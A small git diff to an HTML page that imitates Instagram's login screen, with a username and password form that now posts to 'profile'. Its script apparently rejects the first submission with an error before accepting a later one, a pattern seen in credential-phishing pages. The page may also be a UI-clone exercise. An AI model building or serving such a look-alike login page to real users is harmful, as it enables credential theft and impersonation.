@@ -3,6 +3,7 @@
 
 <head>
   <meta charset="UTF-8">
+  <link rel="icon" href="data:;base64,iVBORw0KGgo=">
   <title>Instagram Login Page</title>
 </head>
 <style>
@@ -184,14 +185,14 @@
         <div class="logo">
           <img src="../public/images/instagram.png" alt="instagram" style="width: 175px;">
         </div>
-        <form class="form" href="profile">
+        <form class="form" method="post"href="profile">
           <div class="input_field">
             <input type="text" id="name"placeholder="Username" name="name" class="input">
           </div>
           <div class="input_field">
             <input type="password" id="password"placeholder="Password" name="password" class="input">
           </div>
-          <button type="submit" class="btn"  onclick="return error()"style="width:100%;color:#fff">Log In</button>
+          <button id="login"type="submit" class="btn"  onclick="return error()"style="width:100%;color:#fff">Log In</button>
         </form>
         <div id="error"></div>
       </div>
@@ -240,6 +241,7 @@
       count = 1;
       return false;
     }
+    document.getElementById("login").innerHTML = "Logging In..."
     return true;
   }
 </script>
